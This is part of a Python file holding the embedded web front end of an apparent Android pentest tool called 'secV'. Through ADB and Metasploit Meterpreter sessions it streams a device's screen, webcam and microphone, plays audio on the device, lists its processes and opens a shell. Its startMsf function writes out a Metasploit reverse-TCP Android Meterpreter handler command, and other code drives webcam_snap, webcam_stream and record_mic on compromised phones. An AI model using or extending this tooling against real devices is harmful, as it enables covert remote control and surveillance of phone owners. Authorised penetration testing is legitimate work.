let _msfPollTimer    = null;

function _screenSerial() {
  return document.getElementById('dev-select').value || '';
}

function detectScreenSize() {
  const serial = _screenSerial();
  const qs = serial ? '?serial=' + encodeURIComponent(serial) : '';
  fetch('/api/media/screen/size' + qs).then(r => r.json()).then(d => {
    if (d.ok) {
      _screenDims = {width: d.width, height: d.height};
      _applyScreenAspect(d.width, d.height);
      document.getElementById('screen-dims').textContent = d.width + '×' + d.height;
      showToast('Screen size detected: ' + d.width + '×' + d.height, 'connect', 2500);
    } else {
      showToast('Could not detect screen size — device connected?', 'disconnect', 3000);
    }
  });
}

function _applyScreenAspect(w, h) {
  const wrap = document.getElementById('screen-wrap');
  const maxH = Math.min(window.innerHeight * 0.72, 640);
  const maxW = wrap.offsetWidth || 600;
  let dispH = Math.round(maxW * h / w);
  if (dispH > maxH) dispH = maxH;
  wrap.style.height = dispH + 'px';
  wrap.classList.add('sized');
}

function _screenSource() {
  return document.getElementById('screen-source').value;
}

// Toggle MSF session input visibility based on source
document.addEventListener('DOMContentLoaded', () => {
  const sel = document.getElementById('screen-source');
  if (sel) sel.addEventListener('change', () => {
    const msf = document.getElementById('msf-session-inp');
    if (msf) msf.style.display = sel.value === 'msf' ? '' : 'none';
  });
});

function startScreen() {
  if (_screenActive) return;
  const source = _screenSource();
  if (source === 'msf') { startScreenMsf(); return; }

  _screenActive = true;
  _screenFpsCnt = 0;
  _screenFpsTs  = Date.now();
  const serial  = _screenSerial();
  const img     = document.getElementById('screen-img');
  const ph      = document.getElementById('screen-placeholder');
  const dot     = document.getElementById('screen-dot');
  const stopBtn = document.getElementById('screen-stop-btn');
  const overlay = document.getElementById('screen-overlay');
  const badge   = document.getElementById('screen-source-badge');
  const startBtn= document.getElementById('screen-start-btn');

  // Apply detected aspect ratio if known
  if (_screenDims) _applyScreenAspect(_screenDims.width, _screenDims.height);

  img.src = '/api/media/screen' + (serial ? '?serial=' + encodeURIComponent(serial) : '');
  img.style.display = 'block'; ph.style.display = 'none';
  overlay.style.display = 'block';
  badge.textContent = 'ADB'; badge.style.display = 'block';
  dot.classList.add('on');
  stopBtn.style.display = ''; startBtn.style.display = 'none';

  img.onload = () => {
    _screenFpsCnt++;
    const now = Date.now();
    if (now - _screenFpsTs >= 1000) {
      const fps = (_screenFpsCnt / ((now - _screenFpsTs) / 1000)).toFixed(1);
      document.getElementById('screen-fps').textContent = fps + ' fps';
      _screenFpsCnt = 0; _screenFpsTs = now;
    }
  };
  img.onerror = () => {
    stopScreen();
    showToast('Screen stream error — device authorized over ADB?', 'disconnect', 4000);
  };
  document.getElementById('live-badge').style.display = 'inline';
  showToast('Screen mirror started (ADB)', 'connect', 2000);
}

function startScreenMsf() {
  _screenActive = true;
  const serial  = _screenSerial();
  const session = document.getElementById('msf-session-inp').value || '1';
  const img     = document.getElementById('screen-img');
  const ph      = document.getElementById('screen-placeholder');
  const dot     = document.getElementById('screen-dot');
  const stopBtn = document.getElementById('screen-stop-btn');
  const overlay = document.getElementById('screen-overlay');
  const badge   = document.getElementById('screen-source-badge');
  const startBtn= document.getElementById('screen-start-btn');

  if (_screenDims) _applyScreenAspect(_screenDims.width, _screenDims.height);

  dot.classList.add('on');
  stopBtn.style.display = ''; startBtn.style.display = 'none';
  overlay.style.display = 'block';
  badge.textContent = 'MSF'; badge.style.display = 'block';
  document.getElementById('live-badge').style.display = 'inline';
  ph.style.display = 'none'; img.style.display = 'block';

  function _msfSnap() {
    if (!_screenActive) return;
    const url = '/api/media/screen/msf?session=' + encodeURIComponent(session)
              + (serial ? '&serial=' + encodeURIComponent(serial) : '')
              + '&_t=' + Date.now();
    img.src = url;
  }
  _msfSnap();
  _msfPollTimer = setInterval(_msfSnap, 3000);
  img.onerror = () => {
    stopScreen();
    showToast('MSF screenshot failed — is session ' + session + ' active?', 'disconnect', 5000);
  };
  showToast('Screen mirror started (MSF session ' + session + ', polling 3s)', 'connect', 3000);
}

function stopScreen() {
  _screenActive = false;
  if (_msfPollTimer) { clearInterval(_msfPollTimer); _msfPollTimer = null; }
  const img     = document.getElementById('screen-img');
  img.src       = ''; img.style.display = 'none';
  document.getElementById('screen-placeholder').style.display = '';
  document.getElementById('screen-overlay').style.display     = 'none';
  document.getElementById('screen-dot').classList.remove('on');
  document.getElementById('screen-stop-btn').style.display    = 'none';
  document.getElementById('screen-start-btn').style.display   = '';
  document.getElementById('screen-fps').textContent           = '';
  document.getElementById('screen-source-badge').style.display= 'none';
  document.getElementById('live-badge').style.display         = 'none';
}

function snapScreen() {
  const serial = _screenSerial();
  const url = '/api/media/screen/snap' + (serial ? '?serial='+encodeURIComponent(serial) : '');
  const a = document.createElement('a');
  a.href = url; a.download = 'screen_' + Date.now() + '.png';
  a.click();
}

// ── Camera ────────────────────────────────────────────────────────────────────
function _camShowStream(img, ph) {
  img.style.display = 'block'; ph.style.display = 'none';
  document.getElementById('cam-dot').classList.add('on');
  document.getElementById('cam-stop-btn').style.display = '';
}

function camSnap() {
  const serial = _screenSerial();
  const camId  = document.getElementById('cam-id').value;
  const url    = '/api/media/camera/snap?serial=' + encodeURIComponent(serial) + '&id=' + camId;
  const img    = document.getElementById('camera-img');
  const ph     = document.getElementById('camera-placeholder');
  img.onload   = () => { img.style.display = 'block'; ph.style.display = 'none'; };
  img.onerror  = () => showToast('Camera snap failed — try Meterpreter webcam_snap', 'disconnect', 4000);
  img.src      = url + '&_t=' + Date.now();
}

function startCamAdb() {
  const serial = _screenSerial();
  const camId  = document.getElementById('cam-id').value;
  const img    = document.getElementById('camera-img');
  const ph     = document.getElementById('camera-placeholder');
  img.src = '/api/media/camera/stream_adb?serial=' + encodeURIComponent(serial) + '&id=' + camId + '&_t=' + Date.now();
  _camShowStream(img, ph);
  img.onerror = () => {
    img.style.display = 'none'; ph.style.display = '';
    document.getElementById('cam-dot').classList.remove('on');
    document.getElementById('cam-stop-btn').style.display = 'none';
    showToast('ADB camera stream failed — device connected?', 'disconnect', 4000);
  };
  showToast('Camera stream started (ADB screencap loop)', 'connect', 2500);
}

function startCamStream() {
  const port = document.getElementById('cam-port').value || '8880';
  const img  = document.getElementById('camera-img');
  const ph   = document.getElementById('camera-placeholder');
  img.src    = '/api/media/camera/stream?port=' + port + '&_t=' + Date.now();
  _camShowStream(img, ph);
  img.onerror = () => {
    img.style.display = 'none'; ph.style.display = '';
    document.getElementById('cam-dot').classList.remove('on');
    document.getElementById('cam-stop-btn').style.display = 'none';
    showToast('MSF camera stream failed — run webcam_stream in session first', 'disconnect', 5000);
  };
  showToast('Camera stream started (MSF proxy port ' + port + ')', 'connect', 2500);
}

function stopCam() {
  const img = document.getElementById('camera-img');
  img.src = ''; img.style.display = 'none';
  document.getElementById('camera-placeholder').style.display = '';
  document.getElementById('cam-dot').classList.remove('on');
  document.getElementById('cam-stop-btn').style.display = 'none';
  fetch('/api/media/camera/stop', {method:'POST'});
}

// ── Microphone ────────────────────────────────────────────────────────────────
function toggleMic() {
  if (_micActive) stopMicRecord();
  else startMicRecord();
}

function startMicRecord() {
  _micActive = true;
  const btn    = document.getElementById('mic-btn');
  const serial = _screenSerial();
  const dur    = document.getElementById('mic-dur').value;
  btn.textContent = '■ Stop'; btn.classList.add('active');
  document.getElementById('audio-dot').classList.add('on');
  document.getElementById('mic-status').textContent = 'Recording via ADB…';
  fetch('/api/media/mic/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device: serial, duration: parseInt(dur)})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      _micPollTimer = setInterval(pollMicChunk, (parseInt(dur) + 1) * 1000);
    } else {
      showToast('Mic start failed: ' + (d.error||''), 'disconnect', 4000);
      stopMicRecord();
    }
  });
}

function stopMicRecord() {
  _micActive = false;
  clearInterval(_micPollTimer); _micPollTimer = null;
  document.getElementById('mic-btn').textContent = '▶ ADB';
  document.getElementById('mic-btn').classList.remove('active');
  document.getElementById('audio-dot').classList.remove('on');
  document.getElementById('mic-status').textContent = 'Stopped';
  fetch('/api/media/mic/stop', {method:'POST'});
}

function msfMicRec() {
  const session = document.getElementById('msf-session-inp').value || '1';
  const dur     = parseInt(document.getElementById('mic-dur').value) || 5;
  const btn     = document.getElementById('mic-msf-btn');
  btn.classList.add('active'); btn.textContent = '…';
  document.getElementById('mic-status').textContent = 'MSF record_mic (' + dur + 's)…';
  document.getElementById('audio-dot').classList.add('on');
  fetch('/api/media/mic/msf', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({session, duration: dur})
  }).then(r => r.json()).then(d => {
    btn.classList.remove('active'); btn.textContent = '▶ MSF';
    document.getElementById('audio-dot').classList.remove('on');
    if (d.ok) {
      pollMicChunk();
      document.getElementById('mic-status').textContent = 'MSF recording saved';
      showToast('MSF mic recording complete', 'connect', 2500);
    } else {
      document.getElementById('mic-status').textContent = 'MSF error: ' + (d.error||'');
      showToast('MSF mic failed: ' + (d.error||''), 'disconnect', 4000);
    }
  });
}

function pollMicChunk() {
  fetch('/api/media/mic/chunk').then(r => {
    if (!r.ok) return;
    return r.blob();
  }).then(blob => {
    if (!blob) return;
    const url   = URL.createObjectURL(blob);
    const audio = document.getElementById('mic-audio');
    audio.src   = url; audio.style.display = 'block';
    const ts    = new Date().toLocaleTimeString();
    document.getElementById('mic-status').textContent = 'Last chunk: ' + ts;
    _animateMicBars();
  }).catch(()=>{});
}

function _animateMicBars() {
  const viz = document.getElementById('mic-visualizer');
  viz.innerHTML = '';
  for (let i=0;i<24;i++) {
    const b = document.createElement('div');
    b.className = 'mic-bar';
    b.style.height = Math.floor(Math.random()*22+4)+'px';
    viz.appendChild(b);
  }
  setTimeout(() => { viz.innerHTML = ''; }, 800);
}

// ── Speaker ───────────────────────────────────────────────────────────────────
let _speakerB64 = '';

function speakerFileChosen(input) {
  const file = input.files[0];
  if (!file) return;
  _speakerFile = file;
  document.getElementById('spk-label').textContent = file.name;
  document.getElementById('spk-status').textContent = 'Ready: ' + file.name;
  const reader = new FileReader();
  reader.onload = e => {
    _speakerB64 = e.target.result.split(',')[1];
  };
  reader.readAsDataURL(file);
}

function pushSpeaker() {
  if (!_speakerB64) { showToast('Select an audio file first', 'info', 2500); return; }
  const ext    = (_speakerFile.name.split('.').pop() || 'mp3').toLowerCase();
  const serial = _screenSerial();
  document.getElementById('spk-status').textContent = 'Pushing to device…';
  fetch('/api/media/speaker', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device: serial, data: _speakerB64, ext})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      document.getElementById('spk-status').textContent = 'Playing: ' + d.path;
      showToast('Audio pushed and playing on device', 'connect', 3000);
    } else {
      document.getElementById('spk-status').textContent = 'Error: ' + (d.error||'failed');
      showToast('Speaker push failed: ' + (d.error||''), 'disconnect', 4000);
    }
  });
}

function stopSpeaker() {
  const serial = _screenSerial();
  fetch('/api/media/speaker/stop', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device: serial})
  }).then(r => r.json()).then(d => {
    document.getElementById('spk-status').textContent = d.ok ? 'Stopped' : 'Stop failed';
    if (d.ok) showToast('Audio stopped on device', 'connect', 2000);
  });
}

// ── MSF Meterpreter Console ───────────────────────────────────────────────────
function startMsf() {
  const serial = _screenSerial();
  const lhost  = (settings.lhost || '');
  const lport  = (settings.lport || '4444');
  const init   = lhost
    ? `use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; run -j`
    : '';
  fetch('/api/msf/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({init})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      connectMsfSSE();
      setMsfStatus(true);
      showToast('msfconsole started', 'connect', 2500);
    } else {
      showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
    }
  });
}

function stopMsf() {
  fetch('/api/msf/stop', {method:'POST'}).then(()=>{
    setMsfStatus(false);
    if (_msfEs) { _msfEs.close(); _msfEs = null; }
    showToast('msfconsole stopped', 'info', 2000);
  });
}

function checkMsfStatus() {
  fetch('/api/msf/sessions').then(r=>r.json()).then(d=>{
    setMsfStatus(d.running);
    if (d.running && !_msfEs) connectMsfSSE();
  }).catch(()=>{});
}

function setMsfStatus(on) {
  const el = document.getElementById('msf-status');
  const dot = document.getElementById('msf-dot');
  el.textContent = on ? 'running' : 'offline';
  el.className   = on ? 'on' : '';
  if (on) dot.classList.add('on'); else dot.classList.remove('on');
}

function connectMsfSSE() {
  if (_msfEs) _msfEs.close();
  _msfEs = new EventSource('/api/msf/stream');
  _msfEs.onmessage = (e) => { msfLine(e.data); msf2Line(e.data); };
  _msfEs.onerror   = () => setTimeout(() => {
    if (_msfEs) { _msfEs.close(); _msfEs = null; }
  }, 3000);
  _msf2Listening = true;
}

function msfLine(raw) {
  const term = document.getElementById('msf-terminal');
  if (!term) return;
  const span = document.createElement('span');
  span.className = 'ln';
  span.innerHTML = ansiToHtml(raw) + '\n';
  term.appendChild(span);
  term.scrollTop = term.scrollHeight;
  // auto-detect webcam stream port announcement
  const portMatch = raw.match(/webcam.*?(\d{4,5})/i);
  if (portMatch) {
    const cp = document.getElementById('cam-port');
    if (cp) cp.value = portMatch[1];
    showToast('Webcam stream on port ' + portMatch[1] + ' — click Camera ▶ Stream', 'info', 5000);
  }
  // session opened alert
  if (/meterpreter session \d+ opened/i.test(raw)) {
    setMsfStatus2(true);
    pdRefreshMsfSessions();
    const b = document.getElementById('msf-badge');
    if (b) { b.textContent = '●'; b.style.display = 'inline'; }
    showToast('Meterpreter session opened!', 'connect', 5000);
  }
}

function msfSend(cmd) {
  fetch('/api/msf/send', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cmd})
  }).then(r => r.json()).then(d => {
    if (!d.ok) showToast('MSF send failed: ' + (d.error||''), 'disconnect', 3000);
  });
  // echo to terminal
  msfLine('\x1b[36mmsf> ' + cmd + '\x1b[0m');
}

function msfEnter(e) {
  if (e.key !== 'Enter') return;
  const inp = document.getElementById('msf-input');
  const cmd = inp.value.trim();
  if (!cmd) return;
  inp.value = '';
  msfSend(cmd);
}

// ── PTY Shell Terminal ────────────────────────────────────────────────────────
let _ptyEs        = null;
let _ptyActive    = false;
let _ptyScroll    = true;
let _ptyHistory   = [];
let _ptyHistIdx   = -1;
let _ptyLineCount = 0;
let _ptyLastCmd   = '';   // track last sent command to suppress echo
let _ptySessionId = 0;   // matches server _pty_session; clears DOM on mismatch
const ANSI_MAP_FULL = {
  '0':'reset','1':'bold','30':'#555','31':'#ff4444','32':'#00ff88','33':'#ffcc44',
  '34':'#4488ff','35':'#aa66ff','36':'#44ddff','37':'#c0c0d8',
  '90':'#505070','91':'#ff6666','92':'#44ff99','93':'#ffdd66',
  '94':'#66aaff','95':'#cc88ff','96':'#66ddff','97':'#ffffff',
};

function startPty() {
  const cols = Math.max(80, Math.floor((document.getElementById('pty-output').clientWidth || 900) / 8));
  const rows = Math.max(24, Math.floor((document.getElementById('pty-output').clientHeight || 600) / 18));
  fetch('/api/pty/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cols, rows})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      _ptyActive = true;
      setPtyStatus(true, d.shell);
      connectPtySSE();
      showToast('Shell started: ' + d.shell, 'connect', 2000);
      // clear shell init noise (fastfetch, motd, etc.) after init completes
      setTimeout(clearPty, 500);
    } else {
      showToast('Shell start failed: ' + (d.error||''), 'disconnect', 4000);
    }
  }).catch(e => showToast('PTY error: ' + e, 'disconnect', 4000));
}

function ptyKill() {
  fetch('/api/pty/kill', {method:'POST'}).then(() => {
    _ptyActive = false;
    setPtyStatus(false);
    if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
    showToast('Shell killed', 'info', 2000);
  });
}

function setPtyStatus(on, shell='') {
  const dot   = document.getElementById('pty-dot');
  const txt   = document.getElementById('pty-status');
  const btn   = document.getElementById('pty-start-btn');
  const info  = document.getElementById('pty-info');
  const badge = document.getElementById('shell-badge');
  dot.classList.toggle('on', on);
  txt.classList.toggle('on', on);
  txt.textContent = on ? 'active' : 'inactive';
  if (btn)   btn.textContent = on ? '↺ restart' : '▶ start shell';
  if (info)  info.textContent = on && shell ? shell : '';
  if (badge) { badge.textContent = '●'; badge.style.display = on ? 'inline' : 'none'; }
}

function connectPtySSE() {
  if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
  const es = new EventSource('/api/pty/stream?sid=' + _ptySessionId);
  _ptyEs = es;
  es.onmessage = (e) => {
    if (es !== _ptyEs) return;   // stale connection — discard
    let data = e.data;
    // session handshake: server sends {"pty_sid":N} as first event
    if (data.startsWith('{"pty_sid":')) {
      try {
        const sid = JSON.parse(data).pty_sid;
        if (sid !== _ptySessionId) {
          _ptySessionId = sid;
          clearPty();   // new session — wipe stale DOM
        }
      } catch(_) {}
      return;
    }
    try { data = JSON.parse(data); } catch(_) {}
    ptyWrite(data);
  };
  es.onerror = () => {
    if (es !== _ptyEs) return;
    es.close();          // prevent browser auto-reconnect + buffer replay
    _ptyEs = null;
    _ptyActive = false;
    setPtyStatus(false);
  };
}

function ptyWrite(raw) {
  const clean = ptyStripCtrl(raw);

  // detect shell-exited sentinel broadcast by the server reader thread
  if (clean.includes('[shell exited]') || clean.includes('[shell killed]')) {
    _ptyActive = false;
    setPtyStatus(false);
    if (_ptyEs) { _ptyEs.close(); _ptyEs = null; }
    const out = document.getElementById('pty-output');
    const note = document.createElement('div');
    note.style.cssText = 'color:var(--muted);font-size:0.65rem;padding:6px 0;letter-spacing:0.06em;';
    note.textContent = '— shell exited —';
    out.appendChild(note);
    if (_ptyScroll) out.scrollTop = out.scrollHeight;
    return;
  }

  // drop pure-whitespace chunks (zsh RPROMPT line clearing)
  if (!clean.trim()) return;

  // suppress echo: if chunk is just the command we sent back
  if (_ptyLastCmd) {
    const stripped = clean.replace(/\n/g, '').trim();
    if (stripped === _ptyLastCmd.trim()) { _ptyLastCmd = ''; return; }
    // partial echo — starts with our command
    if (stripped.startsWith(_ptyLastCmd.trim())) _ptyLastCmd = '';
  }

  const out = document.getElementById('pty-output');
  const span = document.createElement('span');
  span.innerHTML = ptyAnsi(raw);
  out.appendChild(span);
  _ptyLineCount += (clean.match(/\n/g)||[]).length;
  const info = document.getElementById('pty-info');
  if (info && _ptyActive) info.textContent = _ptyLineCount + ' lines';
  if (_ptyScroll) out.scrollTop = out.scrollHeight;
}

function ptyStripCtrl(s) {
  return s
    // OSC: ESC ] ... BEL  or  ESC ] ... ESC \  (window title, CWD, icon name, etc.)
    .replace(/\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g, '')
    // DEC private mode: ESC [ ? digits letter  (bracketed paste, cursor keys, etc.)
    .replace(/\x1b\[\?[0-9;]*[a-zA-Z]/g, '')
    // CSI non-SGR: ESC [ digits letter  (NOT m — keep color codes for ptyAnsi)
    .replace(/\x1b\[[0-9;]*[A-LN-Za-ln-z]/g, '')
    // Application keypad: ESC =  ESC >
    .replace(/\x1b[=>]/g, '')
    // Charset designation: ESC ( x  ESC ) x
    .replace(/\x1b[()][^\r\n]/g, '')
    // Any remaining lone ESC (NOT followed by [ which is a CSI we still need for colors)
    .replace(/\x1b(?!\[)/g, '')
    // CR handling
    .replace(/\r\n/g, '\n')
    .replace(/\r/g, '')
    // Non-printable C0 controls except \n and \t
    .replace(/[\x00-\x08\x0b\x0c\x0e-\x1a\x1c-\x1f]/g, '');
}

function ptyAnsi(s) {
  s = ptyStripCtrl(s);
  // Convert remaining ANSI SGR color codes to HTML spans
  let out = ''; let fg = null; let bold = false;
  const parts = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .split(/(\x1b\[[0-9;]*m)/);
  for (const p of parts) {
    const esc = p.match(/^\x1b\[([0-9;]*)m$/);
    if (esc) {
      const codes = esc[1].split(';'); const cmd = 'm';
      if (cmd === 'm') {
        if (fg) { out += '</span>'; fg = null; bold = false; }
        for (const c of codes) {
          if (c === '0' || c === '') { /* reset */ }
          else if (c === '1') bold = true;
          else if (ANSI_MAP_FULL[c] && ANSI_MAP_FULL[c] !== 'reset') {
            fg = ANSI_MAP_FULL[c];
            out += `<span style="color:${fg}${bold?';font-weight:bold':''}">`;
          }
        }
      }
      continue;
    }
    out += p;
  }
  if (fg) out += '</span>';
  return out;
}

function ptyInputSend(text) {
  if (!_ptyActive) { startPty(); return; }
  // track command for echo suppression (strip trailing newline for comparison)
  const cmd = text.replace(/\n$/, '');
  if (cmd) _ptyLastCmd = cmd;
  fetch('/api/pty/input', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({text})
  });
}

function ptyKeyDown(e) {
  const inp = document.getElementById('pty-input');
  if (e.key === 'Enter') {
    const cmd = inp.value;
    inp.value = '';
    if (cmd.trim()) {
      _ptyHistory.unshift(cmd);
      if (_ptyHistory.length > 200) _ptyHistory.pop();
    }
    _ptyHistIdx = -1;
    _ptyLastCmd = cmd;
    ptyInputSend(cmd + '\n');
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (_ptyHistIdx < _ptyHistory.length - 1) {
      _ptyHistIdx++;
      inp.value = _ptyHistory[_ptyHistIdx] || '';
    }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (_ptyHistIdx > 0) { _ptyHistIdx--; inp.value = _ptyHistory[_ptyHistIdx] || ''; }
    else { _ptyHistIdx = -1; inp.value = ''; }
  } else if (e.key === 'Tab') {
    e.preventDefault();
    // send TAB to PTY for shell completion
    ptyInputSend('\t');
  } else if (e.key === 'c' && e.ctrlKey) {
    e.preventDefault();
    ptyInputSend('\x03');  // SIGINT
  } else if (e.key === 'd' && e.ctrlKey) {
    e.preventDefault();
    ptyInputSend('\x04');  // EOF
  } else if (e.key === 'l' && e.ctrlKey) {
    e.preventDefault();
    ptyInputSend('\x0c');  // clear screen
  }
}

function clearPty() {
  document.getElementById('pty-output').innerHTML = '';
  _ptyLineCount = 0;
}

function togglePtyScroll() {
  _ptyScroll = !_ptyScroll;
  document.getElementById('pty-scroll-btn').classList.toggle('active', _ptyScroll);
}

// Auto-resize PTY when panel resizes
const _ptyResizeObs = new ResizeObserver(() => {
  if (!_ptyActive) return;
  const out = document.getElementById('pty-output');
  if (!out) return;
  const cols = Math.max(80, Math.floor(out.clientWidth  / 8));
  const rows = Math.max(24, Math.floor(out.clientHeight / 18));
  fetch('/api/pty/resize', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cols, rows})
  });
});
document.addEventListener('DOMContentLoaded', () => {
  const out = document.getElementById('pty-output');
  if (out) _ptyResizeObs.observe(out);

  // sidebar: default hidden; restore from localStorage
  const sb  = document.getElementById('sidebar');
  const btn = document.getElementById('sidebar-toggle-btn');
  let stored;
  try { stored = localStorage.getItem('secv_sidebar_hidden'); } catch(e) {}
  const hidden = stored === null ? true : stored === '1';
  if (hidden) sb.classList.add('hidden');
  else btn.classList.add('active');

  // close APK browser on Escape
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
      const ov = document.getElementById('apk-browser-overlay');
      if (ov && ov.classList.contains('show')) { apkBrowserClose(); e.preventDefault(); }
    }
  });
});

// ── Process Sniffer ───────────────────────────────────────────────────────────
let _procEs         = null;
let _procFilter     = '';
let _procList       = [];
let _procSelected   = null;

function showProcSniff(visible) {
  const panel = document.getElementById('proc-sniff-panel');
  if (visible) panel.classList.add('visible');
  else {
    panel.classList.remove('visible');
    stopProcStream();
  }
}

function onPsFilter() {
  _procFilter = document.getElementById('ps-filter').value.toLowerCase();
  renderProcTable(_procList);
}

function renderProcTable(procs) {
  const filt   = _procFilter;
  const tbody  = document.getElementById('proc-tbody');
  const cnt    = document.getElementById('ps-count');
  const rows   = filt
    ? procs.filter(p => p.name.toLowerCase().includes(filt) || p.pid.includes(filt))
    : procs;
  cnt.textContent = rows.length + ' / ' + procs.length + ' procs';
  const frag = document.createDocumentFragment();
  rows.forEach(p => {
    const tr = document.createElement('tr');
    if (_procSelected && _procSelected === p.pid) tr.classList.add('selected');
    const sc = 'ps-state-' + p.state.charAt(0).toUpperCase();
    tr.innerHTML =
      `<td class="ps-pid">${p.pid}</td>` +
      `<td class="ps-pid">${p.ppid}</td>` +
      `<td class="ps-user">${p.user}</td>` +
      `<td class="${sc}">${p.state}</td>` +
      `<td class="ps-name" title="${p.name}">${p.name}</td>`;
    tr.onclick = () => selectProc(p);
    frag.appendChild(tr);
  });
  tbody.textContent = '';
  tbody.appendChild(frag);
}

function selectProc(p) {
  _procSelected = p.pid;
  // Fill target_process field
  const field = document.querySelector('.param-field[data-name="target_process"]');
  if (field) field.value = p.pid;
  renderProcTable(_procList);
  showToast(`Selected PID ${p.pid} — ${p.name}`, 'connect', 2500);
}

function refreshProcs() {
  const serial = document.getElementById('dev-select').value || '';
  const url    = '/api/proc/list?serial=' + encodeURIComponent(serial) +
                 (settings ? '' : '');
  fetch(url).then(r => r.json()).then(d => {
    _procList = d.procs || [];
    renderProcTable(_procList);
  }).catch(e => showToast('proc list error: ' + e, 'disconnect', 3000));
}

function toggleProcStream() {
  if (_procEs) { stopProcStream(); return; }
  const serial = document.getElementById('dev-select').value || '';
  const url    = '/api/proc/stream?serial=' + encodeURIComponent(serial);
  _procEs      = new EventSource(url);
  _procEs.onmessage = e => {
    try {
      const d = JSON.parse(e.data);
      _procList = d.procs || [];
      renderProcTable(_procList);
    } catch(_) {}
  };
  _procEs.onerror = () => { stopProcStream(); };
  document.getElementById('ps-toggle-btn').textContent = '⏹ stop';
  document.getElementById('ps-toggle-btn').classList.add('active');
}

function stopProcStream() {
  if (_procEs) { _procEs.close(); _procEs = null; }
  document.getElementById('ps-toggle-btn').textContent = '▶ stream';
  document.getElementById('ps-toggle-btn').classList.remove('active');
}

// ── Utils ─────────────────────────────────────────────────────────────────────
function now() {
  return new Date().toLocaleTimeString('en-GB',{hour12:false,
    hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
</script>
</body>
</html>
"""


# ── Server launcher ────────────────────────────────────────────────────────────

class _ThreadingServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True


def launch(port: int = _GUI_PORT, serial: str = "", open_browser: bool = True):
    """Start the GUI HTTP server. Blocks until KeyboardInterrupt."""
    server = _ThreadingServer(("127.0.0.1", port), _Handler)
    url    = f"http://127.0.0.1:{port}"
    print(f"\x1b[32m[+] secV Android GUI running at {url}\x1b[0m", file=sys.stderr)
    print(f"    Press Ctrl+C to stop", file=sys.stderr)
    if open_browser:
        threading.Timer(0.8, lambda: webbrowser.open(url)).start()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\x1b[33m[*] Stopped\x1b[0m", file=sys.stderr)
    finally:
        server.server_close()


# ── CLI entry ─────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="secV Android Pentest GUI")
    ap.add_argument("--port",   type=int, default=_GUI_PORT, help="HTTP port (default 8897)")
    ap.add_argument("--serial", default="",                  help="Default ADB device serial")
    ap.add_argument("--no-browser", action="store_true",     help="Do not auto-open browser")
    args = ap.parse_args()
    launch(port=args.port, serial=args.serial, open_browser=not args.no_browser)


if __name__ == "__main__":
    main()
